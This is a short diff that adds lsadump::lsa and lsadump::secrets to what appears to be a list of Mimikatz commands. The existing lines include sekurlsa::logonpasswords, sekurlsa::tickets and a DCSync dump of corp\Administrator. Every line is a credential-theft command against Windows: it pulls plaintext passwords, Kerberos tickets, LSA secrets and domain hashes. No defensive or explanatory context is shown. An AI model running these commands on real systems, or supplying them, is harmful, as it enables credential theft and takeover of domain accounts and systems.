@@ -7,3 +7,7 @@ sekurlsa::logonpasswords
 sekurlsa::tickets
 
 lsadump::dcsync /user:corp\Administrator
+
+lsadump::lsa
+
+lsadump::secrets
